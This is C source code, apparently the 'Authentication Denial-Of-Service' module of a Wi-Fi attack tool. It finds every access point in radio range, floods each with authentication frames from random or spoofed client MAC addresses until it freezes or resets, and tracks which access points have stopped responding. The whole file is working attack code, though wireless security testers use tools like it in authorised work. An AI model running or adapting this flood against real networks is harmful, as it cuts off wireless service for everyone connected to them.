#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#include "auth_dos.h"
#include "../osdep.h"
#include "../helpers.h"
#include "../linkedlist.h"

#define AUTH_DOS_MODE 'a'
#define AUTH_DOS_NAME "Authentication Denial-Of-Service"

#define AUTH_DOS_STATUS_NEW	0
#define AUTH_DOS_STATUS_UP	1
#define AUTH_DOS_STATUS_FROZEN	2

struct auth_dos_options {
  struct ether_addr *target;
  unsigned char valid_mac;
  unsigned char intelligent;
  unsigned int speed;
};

//Global things, shared by packet creation and stats printing
pthread_t *sniffer = NULL;
struct clistauthdos *aps = NULL, *increment_here = NULL;
unsigned int apcount = 0;

void auth_dos_shorthelp()
{
  printf("  Sends authentication frames to all APs found in range.\n");
  printf("  Too many clients can freeze or reset several APs.\n");
}

void auth_dos_longhelp()
{
  printf( "  Sends authentication frames to all APs found in range.\n"
	  "  Too many clients can freeze or reset several APs.\n"
	  "      -a <ap_mac>\n"
	  "         Only test the specified AP\n"
	  "      -m\n"
	  "         Use valid client MAC from built-in OUI database\n"
	  "      -i <ap_mac>\n"
	  "         Perform intelligent test on AP\n"
	  "         This test connects clients to the AP and reinjects sniffed data to keep them alive.\n"
	  "      -s <pps>\n"
	  "         Set speed in packets per second (Default: unlimited)\n");
}

void *auth_dos_parse(int argc, char *argv[]) {
  int opt;
  struct auth_dos_options *aopt = malloc(sizeof(struct auth_dos_options));
  
  aopt->target = NULL;
  aopt->valid_mac = 0;
  aopt->intelligent = 0;
  aopt->speed = 0;
  
  while ((opt = getopt(argc, argv, "a:mi:s:")) != -1) {
    switch (opt) {
      case 'a':
	if (aopt->intelligent) { printf("Select normal OR intelligent attack (either -a or -i), not both!\n"); return NULL; }
	aopt->target = malloc(sizeof(struct ether_addr));
	*(aopt->target) = parse_mac(optarg);
      break;
      case 'm':
	aopt->valid_mac = 1;
      break;
      case 'i':
	if (aopt->target) { printf("Select normal OR intelligent attack (either -a or -i), not both!\n"); return NULL; }
	aopt->intelligent = 1;
	aopt->target = malloc(sizeof(struct ether_addr));
	*(aopt->target) = parse_mac(optarg);
      break;
      case 's':
	aopt->speed = (unsigned int) atoi(optarg);
      break;
      default:
	auth_dos_longhelp();
	printf("\n\nUnknown option %c\n", opt);
	return NULL;
    }
  }
  
  return (void *) aopt;
}


void auth_dos_sniffer() {
  struct packet sniffed;
  struct ieee_hdr *hdr;
  struct ether_addr *bssid, *dup;
  struct clistauthdos *curap;
  static struct ether_addr dupdetect;
  
  while(1) {
    sniffed = osdep_read_packet();
    if (sniffed.len == 0) exit(-1);
    
    dup = get_destination(&sniffed);
    if (MAC_MATCHES(dupdetect, *dup)) continue;  //Duplicate ignored
    MAC_COPY(dupdetect, *dup);
    
    //Check for APs in status UP and missing over 50!
    if (aps) {
      curap = aps;
      do {
	if ((curap->status == AUTH_DOS_STATUS_UP) && (curap->missing > 50)) {
	  printf("\rAP "); print_mac(curap->ap); printf(" has stopped responding and seems to be frozen after %d clients.\n", curap->responses);
	  curap->status = AUTH_DOS_STATUS_FROZEN;
	}
	curap = curap->next;
      } while (curap != aps);
    }
    
    hdr = (struct ieee_hdr *) sniffed.data;
    bssid = get_bssid(&sniffed);
    curap = search_ap(aps, *bssid);
    
    if (hdr->type == IEEE80211_TYPE_BEACON) {
      if (! curap) { //New AP!
	aps = add_to_clistauthdos(aps, *bssid, AUTH_DOS_STATUS_NEW, 0, 0);
	apcount++;
        printf("\rFound new target AP "); print_mac(*bssid); printf("         \n");
      }
    }
    
    if (hdr->type == IEEE80211_TYPE_AUTH) {
      struct auth_fixed *authpack = (struct auth_fixed *) (sniffed.data + sizeof(struct ieee_hdr));
      
      if (authpack->seq == htole16((uint16_t) 2)) {
	if (authpack->status == 0) {
	  curap->responses++;
	  if (curap->status == AUTH_DOS_STATUS_NEW) {
	    printf("\rAP "); print_mac(*bssid); printf(" is responding!              \n");
	    curap->status = AUTH_DOS_STATUS_UP;
	    curap->missing = 0;
	  } else if ((curap->status == AUTH_DOS_STATUS_UP) && (! (curap->responses % 500))) {
	     printf("\rAP "); print_mac(*bssid); printf(" is currently handling %d clients!!!\n", curap->responses);
	  }
	  if (curap->status == AUTH_DOS_STATUS_FROZEN) {
	    printf("\rAP "); print_mac(*bssid); printf(" is accepting connections again!\n");
	    curap->status = AUTH_DOS_STATUS_UP;
	    curap->missing = 0;
	    curap->responses = 1;
	  }
	} else {
	  if (curap->status != AUTH_DOS_STATUS_FROZEN) {
	    printf("\rAP "); print_mac(*bssid); printf(" is reporting ERRORs and denies connections after %d clients!\n", curap->responses);
	    curap->status = AUTH_DOS_STATUS_FROZEN;
	  }
	}
      }
    }
  }
}


struct ether_addr auth_dos_get_target() {
  struct clistauthdos *start;
  char frozen_only = 1;
  unsigned int apnr, i;
  static unsigned int select_any = 0;
  
  while (aps == NULL) {
    printf("\rWaiting for targets...               \n");
    sleep(1);
  }
  
  start = aps;
  do {
    if (start->status != AUTH_DOS_STATUS_FROZEN) {
      frozen_only = 0;
      break;
    }
    start = start->next;
  } while (start != aps);
  
  if (frozen_only) {
    printf("\rAll APs in range seem to be frozen, selecting one of them nonetheless.\n");
    apnr = random() % apcount;
    start = aps;
    for(i=0; i<apnr; i++) start = start->next;
    increment_here = start;
    return start->ap;
  }
  
  select_any++;
  apnr = random() % apcount;
  start = aps;
  for(i=0; i<apnr; i++) start = start->next;
  if (select_any % 3) while (start->status == AUTH_DOS_STATUS_FROZEN) start = start->next; //every third round, frozen APs will also be targeted
  increment_here = start;
  return start->ap;
}


struct packet auth_dos_getpacket(void *options) {
  struct auth_dos_options *aopt = (struct auth_dos_options *) options;
  struct packet pkt;
  static struct ether_addr bssid, client;
  static unsigned int nb_sent = 0;
  static time_t t_prev = 0;
  
  if (! sniffer) {
    sniffer = malloc(sizeof(pthread_t));
    pthread_create(sniffer, NULL, (void *) auth_dos_sniffer, (void *) NULL);
  }

  if (! aopt->target) {
     if ((nb_sent % 1024 == 0) || ((time(NULL) - t_prev) >= 5)) {
       t_prev = time(NULL);
       bssid = auth_dos_get_target();
       printf("\rSelected new target "); print_mac(bssid); printf("          \n");
     }
  }

  if (aopt->valid_mac) client = generate_mac(MAC_KIND_CLIENT);
  else client = generate_mac(MAC_KIND_RANDOM);
  
  pkt = create_auth(bssid, client, 1);
  
  if (aopt->speed) sleep_till_next_packet(aopt->speed);

  nb_sent++;
  increment_here->missing++;  //This gets reset once a response comes in

  return pkt;
}

void auth_dos_print_stats(void *options) {

  
}

void auth_dos_perform_check(void *options) {
  
  
}

struct attacks load_auth_dos() {
  struct attacks this_attack;
  char *auth_dos_name = malloc(strlen(AUTH_DOS_NAME) + 1);
  strcpy(auth_dos_name, AUTH_DOS_NAME);

  this_attack.print_shorthelp = (fp) auth_dos_shorthelp;
  this_attack.print_longhelp = (fp) auth_dos_longhelp;
  this_attack.parse_options = (fpo) auth_dos_parse;
  this_attack.get_packet = (fpp) auth_dos_getpacket;
  this_attack.print_stats = (fps) auth_dos_print_stats;
  this_attack.perform_check = (fps) auth_dos_perform_check;
  this_attack.mode_identifier = AUTH_DOS_MODE;
  this_attack.attack_name = auth_dos_name;

  return this_attack;
}